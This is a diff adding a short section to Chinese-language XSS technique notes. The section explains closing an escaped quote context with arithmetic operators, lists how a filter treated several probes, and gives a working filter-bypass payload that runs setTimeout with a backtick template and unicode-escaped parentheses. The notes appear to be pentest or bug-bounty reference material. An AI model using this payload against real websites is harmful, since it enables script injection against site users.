@@ -43,6 +43,20 @@ https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
 
 
 
+如果允许但引号逃逸,闭合可以采用运算来避免错误。
+
+```
+<, > ==> REMOVED
+'-anything()-' ==> '-anything-'
+'-alert()-' ==> REMOVED
+'-setTimeout``-' = allowed
+
+Final Payload:
+'-setTimeout`prompt\u0028document.domain\u0029`-
+```
+
+
+
 
 
 ## 挖掘XSS技巧
